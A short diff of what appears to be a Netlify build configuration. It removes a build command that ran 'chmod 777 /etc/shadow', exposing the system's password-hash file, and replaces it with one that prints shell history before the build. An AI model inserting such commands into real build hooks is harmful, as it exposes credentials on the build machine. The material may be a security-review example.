@@ -1,5 +1,5 @@
 [build]
   publish = "dist"
-  command = "chmod 777 /etc/shadow && npm run generate"
+  command = "history && npm run generate"
 [build.environment]
   NODE_VERSION = "14"
